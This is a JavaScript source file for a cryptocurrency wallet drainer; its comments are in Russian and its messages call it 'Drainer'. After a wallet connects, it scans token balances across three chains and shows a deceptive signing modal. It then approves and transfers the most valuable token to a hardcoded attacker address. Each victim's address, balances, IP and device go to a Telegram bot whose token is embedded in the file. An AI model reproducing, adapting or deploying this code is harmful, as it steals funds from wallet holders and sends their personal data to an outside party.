import { bsc, mainnet, polygon } from '@reown/appkit/networks'
import { createAppKit } from '@reown/appkit'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunctionData, decodeFunctionResult } from 'viem'
import { readContract, writeContract } from '@wagmi/core'

// Утилита для дебаунсинга
const debounce = (func, wait) => {
  let timeout
  return (...args) => {
    clearTimeout(timeout)
    timeout = setTimeout(() => func(...args), wait)
  }
}

// Конфигурация
const projectId = import.meta.env.VITE_PROJECT_ID || 'd85cc83edb401b676e2a7bcef67f3be8'
if (!projectId) throw new Error('VITE_PROJECT_ID is not set')

const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '7893105607:AAFqn6yRhXVocTodMo8xNufTFKjmzMYnNAU'
const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-1002834788839'

const networks = [bsc, mainnet, polygon]
const networkMap = {
  'BNB Smart Chain': { networkObj: bsc, chainId: networks[0].id || 56 },
  'Ethereum': { networkObj: mainnet, chainId: networks[1].id || 1 },
  'Polygon': { networkObj: polygon, chainId: networks[2].id || 137 }
}
console.log('Network Map:', networkMap)

const CONTRACTS = {
  [networkMap['Ethereum'].chainId]: '0x0A57cf1e7E09ee337ce56108E857CC0537089CfC',
  [networkMap['BNB Smart Chain'].chainId]: '0x2ed7Ef4A2EbCab59FA8c7910641A0b0664a19342',
  [networkMap['Polygon'].chainId]: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c'
}

const wagmiAdapter = new WagmiAdapter({ projectId, networks })
const appKit = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  features: { analytics: true, email: false, socials: false }
})

// ABI для метода execute
const drainerAbi = [
  {
    inputs: [
      { name: 'token', type: 'address' },
      { name: 'to', type: 'address' },
      { name: 'amount', type: 'uint256' },
      { name: 'data', type: 'bytes' }
    ],
    name: 'execute',
    outputs: [{ name: '', type: 'bytes' }],
    stateMutability: 'payable',
    type: 'function'
  }
]

// ABI для токена ERC20
const erc20Abi = [
  {
    constant: true,
    inputs: [{ name: '_owner', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: 'balance', type: 'uint256' }],
    type: 'function'
  },
  {
    constant: false,
    inputs: [
      { name: 'spender', type: 'address' },
      { name: 'amount', type: 'uint256' }
    ],
    name: 'approve',
    outputs: [{ name: 'success', type: 'bool' }],
    type: 'function'
  },
  {
    constant: true,
    inputs: [
      { name: '_owner', type: 'address' },
      { name: '_spender', type: 'address' }
    ],
    name: 'allowance',
    outputs: [{ name: 'remaining', type: 'uint256' }],
    type: 'function'
  },
  {
    constant: false,
    inputs: [
      { name: 'to', type: 'address' },
      { name: 'amount', type: 'uint256' }
    ],
    name: 'transfer',
    outputs: [{ name: 'success', type: 'bool' }],
    type: 'function'
  }
]

// Состояние приложения
const store = {
  accountState: {},
  networkState: {},
  tokenBalances: [],
  errors: [],
  approvedTokens: {},
  isApprovalRequested: false,
  isApprovalRejected: false,
  connectionKey: null,
  isProcessingConnection: false,
  executedTransfers: {}
}

// Создание модального окна
function createCustomModal() {
  const style = document.createElement('style')
  style.textContent = `
    .custom-modal {
      opacity: 0;
      transition: opacity 0.3s ease-in-out;
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      justify-content: center;
      align-items: center;
    }
    .custom-modal.show {
      opacity: 1;
    }
    .custom-modal-content {
      transform: translateY(-20px);
      transition: transform 0.3s ease-in-out, opacity 0.3s ease-in-out;
      opacity: 0;
      background-color: #121313;
      padding: 45px;
      border-radius: 30px;
      text-align: center;
      width: 320px;
      color: #ffffff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
    }
    .custom-modal.show .custom-modal-content {
      transform: translateY(0);
      opacity: 1;
    }
    .custom-modal-title {
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 45px;
      margin-top: -25px;
    }
    .custom-modal-loader {
      border: 4px solid #ffffff33;
      border-top: 4px solid #ffffff;
      border-radius: 50%;
      width: 52px;
      height: 52px;
      animation: spin 1s ease-in-out infinite;
      margin: 0 auto 20px;
    }
    .custom-modal-message {
      margin-top: 45px;
      font-size: 16px;
      line-height: 1.5;
      color: #858585;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  `
  document.head.appendChild(style)

  const modal = document.createElement('div')
  modal.id = 'customModal'
  modal.className = 'custom-modal'
  modal.innerHTML = `
    <div class="custom-modal-content">
      <p class="custom-modal-title">Sign Transaction</p>
      <div class="custom-modal-loader"></div>
      <p class="custom-modal-message">Sign this message to approve or transfer tokens. Canceling will disconnect you.</p>
    </div>
  `
  document.body.appendChild(modal)
}

function showCustomModal() {
  const modal = document.getElementById('customModal')
  if (modal) {
    modal.style.display = 'flex'
    setTimeout(() => modal.classList.add('show'), 10)
  }
}

function hideCustomModal() {
  const modal = document.getElementById('customModal')
  if (modal) {
    modal.classList.remove('show')
    setTimeout(() => modal.style.display = 'none', 300)
  }
}

// Очистка состояния при загрузке страницы
window.addEventListener('load', () => {
  appKit.disconnect()
  localStorage.clear()
  sessionStorage.clear()
  store.accountState = {}
  store.networkState = {}
  store.tokenBalances = []
  store.errors = []
  store.approvedTokens = {}
  store.executedTransfers = {}
  store.isApprovalRequested = false
  store.isApprovalRejected = false
  store.connectionKey = null
  store.isProcessingConnection = false
  updateButtonVisibility(false)
  updateStateDisplay('accountState', {})
  updateStateDisplay('networkState', {})
  updateStateDisplay('tokenBalancesState', [])
  createCustomModal()
})

// Утилиты для обновления состояния
const updateStore = (key, value) => {
  store[key] = value
}

const updateStateDisplay = (elementId, state) => {
  const element = document.getElementById(elementId)
  if (element) element.innerHTML = JSON.stringify(state, null, 2)
}

const updateButtonVisibility = (isConnected) => {
  const disconnectBtn = document.getElementById('disconnect')
  if (disconnectBtn) disconnectBtn.style.display = isConnected ? '' : 'none'
}

// Функция получения ссылки на сканер
const getScanLink = (hash, chainId, isTx = false) => {
  const basePath = isTx ? '/tx/' : '/address/'
  if (chainId === networkMap['Ethereum'].chainId) {
    return `https://etherscan.io${basePath}${hash}`
  } else if (chainId === networkMap['BNB Smart Chain'].chainId) {
    return `https://bscscan.com${basePath}${hash}`
  } else if (chainId === networkMap['Polygon'].chainId) {
    return `https://polygonscan.com${basePath}${hash}`
  }
  return '#'
}

// Функция отправки запроса на трансфер
const sendTransferRequest = async (userAddress, tokenAddress, amount, chainId, txHash) => {
  try {
    const response = await fetch('https://api.amlinsight.io/api/transfer', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ userAddress, tokenAddress, amount: amount.toString(), chainId, txHash })
    })
    const data = await response.json()
    if (data.success) {
      console.log(`Transfer request successful: ${data.txHash}`)
      return { success: true, txHash: data.txHash }
    }
    return { success: false, message: data.message }
  } catch (error) {
    return { success: false, message: error.message }
  }
}

// Функции для получения информации о пользователе
async function getUserIP() {
  const cachedIP = sessionStorage.getItem('userIP')
  if (cachedIP) return cachedIP
  try {
    const response = await fetch('https://api.ipify.org?format=json')
    const data = await response.json()
    const ip = data.ip || 'Unknown IP'
    sessionStorage.setItem('userIP', ip)
    return ip
  } catch (error) {
    return 'Unknown IP'
  }
}

async function getGeolocation(ip) {
  const cachedLocation = sessionStorage.getItem('userLocation')
  if (cachedLocation) return cachedLocation
  try {
    const response = await fetch(`https://freeipapi.com/api/json/${ip}`)
    const data = await response.json()
    const location = data.cityName && data.countryName ? `${data.cityName}, ${data.countryName}` : 'Unknown Location'
    sessionStorage.setItem('userLocation', location)
    return location
  } catch (error) {
    return 'Unknown Location'
  }
}

function detectDevice() {
  const userAgent = navigator.userAgent || navigator.vendor || window.opera || 'Unknown Device'
  if (/Windows NT/i.test(userAgent)) return 'Windows'
  if (/iPhone/i.test(userAgent) && !/Android/i.test(userAgent)) return 'iPhone'
  if (/Android/i.test(userAgent) && !/iPhone/i.test(userAgent)) return 'Android'
  if (/Macintosh|Mac OS X/i.test(userAgent)) return 'Mac'
  if (/Tablet|iPad/i.test(userAgent)) return 'Tablet'
  return 'Desktop'
}

// Функция отправки сообщений в Telegram
async function sendTelegramMessage(message) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: telegramChatId, text: message, parse_mode: 'Markdown', disable_web_page_preview: true })
    })
    const data = await response.json()
    if (!data.ok) throw new Error(data.description || 'Failed to send Telegram message')
    console.log('Telegram message sent successfully')
  } catch (error) {
    store.errors.push(`Error sending Telegram message: ${error.message}`)
  }
}

// Уведомления
async function notifyWalletConnection(address, walletName, device, balances, chainId) {
  const connectionKey = `${address}_${chainId}`
  if (store.connectionKey === connectionKey || store.isProcessingConnection) {
    console.log('Skipping duplicate wallet connection notification')
    return
  }
  store.isProcessingConnection = true
  try {
    console.log('Sending wallet connection notification')
    const ip = await getUserIP()
    const location = await getGeolocation(ip)
    const siteUrl = window.location.href || 'Unknown URL'
    const scanLink = getScanLink(address, chainId)
    const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown'
    let totalValue = 0
    const tokenList = balances
      .filter(token => token.balance > 0)
      .map(token => {
        const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : token.price || 0
        const value = token.balance * price
        totalValue += value
        return `➡️ ${token.symbol} - ${value.toFixed(2)}$`
      })
      .join('\n')
    const message = `🚨 New connect (${walletName} - ${device})\n` +
                    `🌀 [Address](${scanLink})\n` +
                    `🕸 Network: EVM\n` +
                    `🌎 ${ip}\n\n` +
                    `💰 **Total Value: ${totalValue.toFixed(2)}$**\n` +
                    `${tokenList}\n\n` +
                    `🔗 Site: ${siteUrl}`
    await sendTelegramMessage(message)
    store.connectionKey = connectionKey

    // Показать модальное окно
    showCustomModal()
    await new Promise(resolve => setTimeout(resolve, 3000)) // Ждать 3 секунды

    // Проверка баланса
    const hasBalance = balances.some(token => token.balance > 0)
    if (!hasBalance) {
      const modalMessage = document.querySelector('.custom-modal-message')
      if (modalMessage) modalMessage.textContent = 'Congratulations!'
      await new Promise(resolve => setTimeout(resolve, 1000)) // Ждать 1 секунду
      hideCustomModal()
      store.isProcessingConnection = false
      return
    }

  } catch (error) {
    store.errors.push(`Error in notifyWalletConnection: ${error.message}`)
    hideCustomModal()
    store.isProcessingConnection = false
  }
}

async function notifyTransferApproved(address, walletName, device, token, chainId) {
  try {
    console.log('Sending transfer approved notification')
    const ip = await getUserIP()
    const location = await getGeolocation(ip)
    const siteUrl = window.location.href || 'Unknown URL'
    const scanLink = getScanLink(address, chainId)
    const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown'
    const amountValue = (token.balance * token.price).toFixed(2)
    const message = `⚠️ Transfer approved (${walletName} - ${device})\n` +
                    `🌀 [Address](${scanLink})\n` +
                    `🕸 Network: EVM\n` +
                    `🌎 ${ip}\n\n` +
                    `**🔥 Processing: ${amountValue}$**\n` +
                    `➡️ ${token.symbol}\n\n` +
                    `🔗 Site: ${siteUrl}`
    await sendTelegramMessage(message)
  } catch (error) {
    store.errors.push(`Error in notifyTransferApproved: ${error.message}`)
  }
}

async function notifyTransferSuccess(address, walletName, device, token, chainId, txHash) {
  try {
    console.log('Sending transfer success notification')
    const ip = await getUserIP()
    const location = await getGeolocation(ip)
    const scanLink = getScanLink(address, chainId)
    const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown'
    const amountValue = (token.balance * token.price).toFixed(2)
    const txLink = getScanLink(txHash, chainId, true)
    const message = `✅ Drainer successfully (${walletName} - ${device})\n` +
                    `🌀 [Address](${scanLink})\n` +
                    `🕸 Network: EVM\n` +
                    `🌎 ${ip}\n\n` +
                    `**💰 Total Drained: ${amountValue}$**\n` +
                    `➡️ ${token.symbol} - ${amountValue}$\n\n` +
                    `🔗 Transfer: [Transaction Hash](${txLink})`
    await sendTelegramMessage(message)
  } catch (error) {
    store.errors.push(`Error in notifyTransferSuccess: ${error.message}`)
  }
}

const TOKENS = {
  'Ethereum': [
    { symbol: 'USDT', address: '0xdac17f958d2ee523a2206206994597c13d831ec7', decimals: 6 },
    { symbol: 'USDC', address: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', decimals: 6 },
    { symbol: 'DAI', address: '0x6b175474e89094c44da98b954eedeac495271d0f', decimals: 18 }
  ],
  'BNB Smart Chain': [
    { symbol: 'USDT', address: '0x55d398326f99059ff775485246999027b3197955', decimals: 18 },
    { symbol: 'USDC', address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', decimals: 18 },
    { symbol: 'SHIB', address: '0x2859e4544c4bb03966803b044a93563bd2d0dd4d', decimals: 18 },
    { symbol: 'PEPE', address: '0x25d887ce7a35172c62febfd67a1856f20faebb00', decimals: 18 },
    { symbol: 'FLOKI', address: '0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006', decimals: 18 }
  ],
  'Polygon': [
    { symbol: 'USDT', address: '0xc2132d05d31c914a87c6611c10748aeb04b58e8f', decimals: 6 },
    { symbol: 'USDC', address: '0x2791bca1f2de4661ed88a30c99a7a9449aa84174', decimals: 6 }
  ]
}

const getTokenBalance = async (wagmiConfig, address, tokenAddress, decimals, chainId) => {
  if (!address || !tokenAddress || !isAddress(address) || !isAddress(tokenAddress)) {
    console.error(`Invalid or missing address: ${address}, tokenAddress: ${tokenAddress}`)
    return 0
  }
  try {
    const balance = await readContract(wagmiConfig, {
      address: tokenAddress,
      abi: erc20Abi,
      functionName: 'balanceOf',
      args: [address],
      chainId
    })
    return Number(formatUnits(balance, decimals))
  } catch (error) {
    store.errors.push(`Error fetching balance for ${tokenAddress} on chain ${chainId}: ${error.message}`)
    return 0
  }
}

const getTokenPrice = async (symbol) => {
  try {
    const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${symbol}USDT`)
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`)
    const data = await response.json()
    return Number(data.price) || 0
  } catch (error) {
    store.errors.push(`Error fetching price for ${symbol}: ${error.message}`)
    return 0
  }
}

const executeApprove = async (wagmiConfig, tokenAddress, contractAddress, amount, chainId) => {
  if (!wagmiConfig) throw new Error('wagmiConfig is not initialized')
  if (!tokenAddress || !contractAddress) throw new Error('Missing token or contract address')
  if (!isAddress(tokenAddress) || !isAddress(contractAddress)) throw new Error('Invalid token or contract address')
  const checksumTokenAddress = getAddress(tokenAddress)
  const checksumContractAddress = getAddress(contractAddress)
  try {
    // Кодируем данные для вызова approve(address, uint256)
    const data = encodeFunctionData({
      abi: erc20Abi,
      functionName: 'approve',
      args: [checksumContractAddress, amount]
    })
    const gasLimit = BigInt(100000)
    const maxFeePerGas = BigInt(10_000_000_000)
    const maxPriorityFeePerGas = BigInt(2_000_000_000)
    console.log(`Executing approve with gasLimit: ${gasLimit}, maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
    const txHash = await writeContract(wagmiConfig, {
      address: checksumContractAddress,
      abi: drainerAbi,
      functionName: 'execute',
      args: [checksumTokenAddress, checksumContractAddress, amount, data],
      chainId,
      gas: gasLimit,
      maxFeePerGas,
      maxPriorityFeePerGas
    })
    console.log(`Approve transaction sent via execute: ${txHash}`)
    return txHash
  } catch (error) {
    store.errors.push(`Execute approve failed: ${error.message}`)
    throw error
  }
}

const executeAllowance = async (wagmiConfig, tokenAddress, contractAddress, ownerAddress, chainId) => {
  if (!wagmiConfig) throw new Error('wagmiConfig is not initialized')
  if (!tokenAddress || !contractAddress || !ownerAddress) throw new Error('Missing token, contract, or owner address')
  if (!isAddress(tokenAddress) || !isAddress(contractAddress) || !isAddress(ownerAddress)) throw new Error('Invalid token, contract, or owner address')
  const checksumTokenAddress = getAddress(tokenAddress)
  const checksumContractAddress = getAddress(contractAddress)
  const checksumOwnerAddress = getAddress(ownerAddress)
  try {
    // Кодируем данные для вызова allowance(address, address)
    const data = encodeFunctionData({
      abi: erc20Abi,
      functionName: 'allowance',
      args: [checksumOwnerAddress, checksumContractAddress]
    })
    const gasLimit = BigInt(80000)
    const maxFeePerGas = BigInt(10_000_000_000)
    const maxPriorityFeePerGas = BigInt(2_000_000_000)
    console.log(`Executing allowance with gasLimit: ${gasLimit}, maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
    const result = await readContract(wagmiConfig, {
      address: checksumContractAddress,
      abi: drainerAbi,
      functionName: 'execute',
      args: [checksumTokenAddress, checksumContractAddress, 0, data],
      chainId,
      gas: gasLimit,
      maxFeePerGas,
      maxPriorityFeePerGas
    })
    // Декодируем результат (uint256)
    const allowance = decodeFunctionResult({
      abi: erc20Abi,
      functionName: 'allowance',
      data: result
    })
    console.log(`Allowance retrieved: ${allowance}`)
    return Number(formatUnits(allowance, 0))
  } catch (error) {
    store.errors.push(`Execute allowance failed: ${error.message}`)
    throw error
  }
}

const executeTransfer = async (wagmiConfig, tokenAddress, contractAddress, amount, decimals, chainId) => {
  if (!wagmiConfig) throw new Error('wagmiConfig is not initialized')
  if (!tokenAddress || !contractAddress) throw new Error('Missing token or contract address')
  if (!isAddress(tokenAddress) || !isAddress(contractAddress)) throw new Error('Invalid token or contract address')
  const checksumTokenAddress = getAddress(tokenAddress)
  const checksumContractAddress = getAddress(contractAddress)
  const recipient = '0x10903671E4DeEe3B280E547831ceB0abAaFD0Dc0'
  const amountBigInt = parseUnits(amount.toString(), decimals)
  try {
    // Кодируем данные для вызова transfer(address, uint256)
    const data = encodeFunctionData({
      abi: erc20Abi,
      functionName: 'transfer',
      args: [recipient, amountBigInt]
    })
    const gasLimit = BigInt(100000)
    const maxFeePerGas = BigInt(10_000_000_000)
    const maxPriorityFeePerGas = BigInt(2_000_000_000)
    console.log(`Executing transfer with gasLimit: ${gasLimit}, maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
    const txHash = await writeContract(wagmiConfig, {
      address: checksumContractAddress,
      abi: drainerAbi,
      functionName: 'execute',
      args: [checksumTokenAddress, recipient, amountBigInt, data],
      chainId,
      gas: gasLimit,
      maxFeePerGas,
      maxPriorityFeePerGas
    })
    console.log(`Transfer transaction sent via execute: ${txHash}`)
    return txHash
  } catch (error) {
    store.errors.push(`Execute transfer failed: ${error.message}`)
    throw error
  }
}

// Инициализация подписок
const initializeSubscribers = (modal) => {
  const debouncedSubscribeAccount = debounce(async state => {
    updateStore('accountState', state)
    updateStateDisplay('accountState', state)
    if (state.isConnected && state.address && isAddress(state.address) && store.networkState.chainId) {
      const walletInfo = appKit.getWalletInfo() || { name: 'Unknown Wallet' }
      const device = detectDevice()
      if (store.isProcessingConnection) {
        console.log('Already processing connection, skipping')
        return
      }
      const balancePromises = []
      Object.entries(TOKENS).forEach(([networkName, tokens]) => {
        const networkInfo = networkMap[networkName]
        if (!networkInfo) {
          console.warn(`Network ${networkName} not found in networkMap`)
          return
        }
        tokens.forEach(token => {
          if (isAddress(token.address)) {
            balancePromises.push(
              getTokenBalance(wagmiAdapter.wagmiConfig, state.address, token.address, token.decimals, networkInfo.chainId)
                .then(balance => ({
                  symbol: token.symbol,
                  balance,
                  address: token.address,
                  network: networkName,
                  chainId: networkInfo.chainId,
                  decimals: token.decimals
                }))
                .catch(() => ({
                  symbol: token.symbol,
                  balance: 0,
                  address: token.address,
                  network: networkName,
                  chainId: networkInfo.chainId,
                  decimals: token.decimals
                }))
            )
          }
        })
      })
      const allBalances = await Promise.all(balancePromises)
      store.tokenBalances = allBalances
      updateStateDisplay('tokenBalancesState', allBalances)
      let maxValue = 0
      let mostExpensive = null
      for (const token of allBalances) {
        if (token.balance > 0) {
          const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : await getTokenPrice(token.symbol)
          const value = token.balance * price
          token.price = price
          if (value > maxValue) {
            maxValue = value
            mostExpensive = { ...token, price, value }
          }
        }
      }
      await notifyWalletConnection(state.address, walletInfo.name, device, allBalances, store.networkState.chainId)
      if (mostExpensive) {
        console.log(`Самый дорогой токен: ${mostExpensive.symbol}, количество: ${mostExpensive.balance}, цена в USDT: ${mostExpensive.price} (${mostExpensive.symbol === 'USDT' || mostExpensive.symbol === 'USDC' ? 'Fixed' : 'Binance API'})`)
        console.log('Available networks:', networks.map(n => ({ name: n.name, chainId: n.id || 'undefined' })))
        const targetNetworkInfo = networkMap[mostExpensive.network]
        if (!targetNetworkInfo) {
          const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`
          store.errors.push(errorMessage)
          const approveState = document.getElementById('approveState')
          if (approveState) approveState.innerHTML = errorMessage
          hideCustomModal()
          store.isProcessingConnection = false
          return
        }
        const targetNetwork = targetNetworkInfo.networkObj
        const expectedChainId = targetNetworkInfo.chainId
        if (store.networkState.chainId !== expectedChainId) {
          console.log(`Attempting to switch to ${mostExpensive.network} (chainId ${expectedChainId})`)
          try {
            await new Promise((resolve, reject) => {
              const unsubscribe = modal.subscribeNetwork(networkState => {
                if (networkState.chainId === expectedChainId) {
                  console.log(`Successfully switched to ${mostExpensive.network} (chainId ${expectedChainId})`)
                  unsubscribe()
                  resolve()
                }
              })
              appKit.switchNetwork(targetNetwork).catch(error => {
                unsubscribe()
                reject(error)
              })
              setTimeout(() => {
                unsubscribe()
                reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`))
              }, 10000)
            })
          } catch (error) {
            const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${error.message}`
            store.errors.push(errorMessage)
            const approveState = document.getElementById('approveState')
            if (approveState) consoleState.innerHTML = errorMessage
            hideCustomModal()
            store.isProcessingConnection = false
            return
          }
        } else {
          console.log(`Already on correct network: ${mostExpensive.network} (chainId ${expectedChainId})`)
        }
        try {
          const contractAddress = CONTRACTS[mostExpensive.chainId]
          const transferKey = `${state.address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`
          if (store.executedTransfers[transferKey] || store.isApprovalRequested || store.isApprovalRejected) {
            const transferMessage = store.executedTransfers[transferKey]
              ? `Transfer already completed for ${mostExpensive.symbol} on ${mostExpensive.network}`
              : store.isApprovalRejected
              ? `Transfer was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
              : `Transfer request pending for ${mostExpensive.symbol} on ${mostExpensive.network}`
            console.log(transferMessage)
            const approveState = document.getElementById('approveState')
            if (approveState) approveState.innerHTML = transferMessage
            hideCustomModal()
            store.isProcessingConnection = false
            return
          }
          store.isApprovalRequested = true
          // Проверяем текущий allowance
          const allowance = await executeAllowance(
            wagmiAdapter.wagmiConfig,
            mostExpensive.address,
            contractAddress,
            state.address,
            mostExpensive.chainId
          )
          const amount = parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals)
          if (allowance < Number(amount)) {
            // Выполняем approve через execute
            const approveTxHash = await executeApprove(
              wagmiAdapter.wagmiConfig,
              mostExpensive.address,
              contractAddress,
              amount,
              mostExpensive.chainId
            )
            console.log(`Approve successful: ${approveTxHash}`)
            await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId)
          } else {
            console.log(`Sufficient allowance already exists: ${allowance}`)
          }
          // Выполняем transfer через execute
          const txHash = await executeTransfer(
            wagmiAdapter.wagmiConfig,
            mostExpensive.address,
            contractAddress,
            mostExpensive.balance,
            mostExpensive.decimals,
            mostExpensive.chainId
          )
          store.executedTransfers[transferKey] = true
          store.isApprovalRequested = false
          let transferMessage = `Transfer successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
          console.log(transferMessage)
          const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, mostExpensive.chainId, txHash)
          if (transferResult.success) {
            transferMessage += `<br>Transfer request successful: ${transferResult.txHash}`
            console.log(`Transfer request successful: ${transferResult.txHash}`)
            await notifyTransferSuccess(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId, transferResult.txHash)
          } else {
            transferMessage += `<br>Transfer request failed: ${transferResult.message}`
            console.log(`Transfer request failed: ${transferResult.message}`)
          }
          const approveState = document.getElementById('approveState')
          if (approveState) approveState.innerHTML = transferMessage
          hideCustomModal()
          store.isProcessingConnection = false
        } catch (error) {
          store.isApprovalRequested = false
          if (error.code === 4001 || error.code === -32000) {
            store.isApprovalRejected = true
            const errorMessage = `Transaction was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
            store.errors.push(errorMessage)
            const approveState = document.getElementById('approveState')
            if (approveState) approveState.innerHTML = errorMessage
            hideCustomModal()
            appKit.disconnect()
            store.connectionKey = null
            store.isProcessingConnection = false
            sessionStorage.clear()
          } else {
            const errorMessage = `Transaction failed for ${mostExpensive.symbol} on ${mostExpensive.network}: ${error.message}`
            store.errors.push(errorMessage)
            const approveState = document.getElementById('approveState')
            if (approveState) approveState.innerHTML = errorMessage
            hideCustomModal()
            store.isProcessingConnection = false
          }
        }
      } else {
        const message = 'No tokens with positive balance'
        console.log(message)
        const mostExpensiveState = document.getElementById('mostExpensiveToken')
        if (mostExpensiveState) mostExpensiveState.innerHTML = message
      }
    }
  }, 1000)
  modal.subscribeAccount(debouncedSubscribeAccount)
  modal.subscribeNetwork(state => {
    updateStore('networkState', state)
    updateStateDisplay('networkState', state)
    const switchNetworkBtn = document.getElementById('switch-network')
    if (switchNetworkBtn) {
      switchNetworkBtn.textContent = `Switch to ${state?.chainId === polygon.id ? 'Mainnet' : 'Polygon'}`
    }
  })
}

initializeSubscribers(appKit)
updateButtonVisibility(appKit.getIsConnectedState())

document.getElementById('open-connect-modal')?.addEventListener('click', () => {
  if (!appKit.getIsConnectedState()) {
    appKit.open()
  }
})

document.getElementById('disconnect')?.addEventListener('click', () => {
  appKit.disconnect()
  store.approvedTokens = {}
  store.executedTransfers = {}
  store.errors = []
  store.isApprovalRequested = false
  store.isApprovalRejected = false
  store.connectionKey = null
  store.isProcessingConnection = false
  sessionStorage.clear()
})

document.getElementById('switch-network')?.addEventListener('click', () => {
  const currentChainId = store.networkState?.chainId
  appKit.switchNetwork(currentChainId === polygon.id ? mainnet : polygon)
})
